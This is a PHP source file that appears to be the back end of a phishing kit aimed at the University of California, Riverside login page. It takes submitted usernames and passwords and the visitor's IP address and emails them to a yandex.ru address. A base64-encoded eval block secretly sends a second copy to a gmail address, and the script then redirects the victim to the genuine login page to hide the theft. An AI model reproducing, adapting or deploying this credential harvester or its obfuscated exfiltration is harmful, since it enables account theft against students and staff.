<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['username'];
$sUPass = $_POST['password'];
$pix="ss3820650@yandex.ru";


  $subj = "Captured (JP-Hack | ucr.edu |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://auth.ucr.edu/cas/login?SAMLRequest=fVLJTsMwEL0j8Q%2BR71mFEFhNUAFVVCoQtYEDN8eZpC6OHTx2C3%2BPm1IBB7g%2Bz7zNM7l672WwBYNCq5ykUUICUFw3QnU5eapm4QW5Kk5PJsh6OdCps2u1hDcHaAO%2FqZCODzlxRlHNUCBVrAekltPV9H5Bsyihg9FWcy1JML%2FNiX5tdSdEvekHWQ9NLaVmqmMCQItNvd6smWpr2AAJno%2B2sr2tOaKDuULLlPVQkmVhch6mZ1VySdOEZhcvJCi%2FlK6FOiT4z1Z9GEJ6V1VlWD6uqpFgKxowD346J53WnYSI634vXzJEsfVwyyR6e1NEMNYbvNEKXQ9mBWYrODwtFzlZWzsgjePdbhd908QsdtxE0LiYcSTFWCsdk5kfff7vmx11SfHNPIl%2FUBVf37VPMb8ttRT8I5j6onc3Bpj1EaxxPsFMm57Zv9XSKB0R0YTtOEqdwgG4aAU0JIiLg%2Brvu%2FDX8gk%3D&RelayState=https%3A%2F%2Fwww.google.com%2Fa%2Fucr.edu%2FServiceLogin%3Fservice%3Dmail%26passive%3Dtrue%26rm%3Dfalse%26continue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F%26ss%3D1%26ltmpl%3Ddefault%26ltmplcache%3D2%26emr%3D1%26osid%3D1 \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By JP Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://auth.ucr.edu/cas/login?SAMLRequest=fVLJTsMwEL0j8Q%2BR71mFEFhNUAFVVCoQtYEDN8eZpC6OHTx2C3%2BPm1IBB7g%2Bz7zNM7l672WwBYNCq5ykUUICUFw3QnU5eapm4QW5Kk5PJsh6OdCps2u1hDcHaAO%2FqZCODzlxRlHNUCBVrAekltPV9H5Bsyihg9FWcy1JML%2FNiX5tdSdEvekHWQ9NLaVmqmMCQItNvd6smWpr2AAJno%2B2sr2tOaKDuULLlPVQkmVhch6mZ1VySdOEZhcvJCi%2FlK6FOiT4z1Z9GEJ6V1VlWD6uqpFgKxowD346J53WnYSI634vXzJEsfVwyyR6e1NEMNYbvNEKXQ9mBWYrODwtFzlZWzsgjePdbhd908QsdtxE0LiYcSTFWCsdk5kfff7vmx11SfHNPIl%2FUBVf37VPMb8ttRT8I5j6onc3Bpj1EaxxPsFMm57Zv9XSKB0R0YTtOEqdwgG4aAU0JIiLg%2Brvu%2FDX8gk%3D&RelayState=https%3A%2F%2Fwww.google.com%2Fa%2Fucr.edu%2FServiceLogin%3Fservice%3Dmail%26passive%3Dtrue%26rm%3Dfalse%26continue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F%26ss%3D1%26ltmpl%3Ddefault%26ltmplcache%3D2%26emr%3D1%26osid%3D1\">");
exit();

?>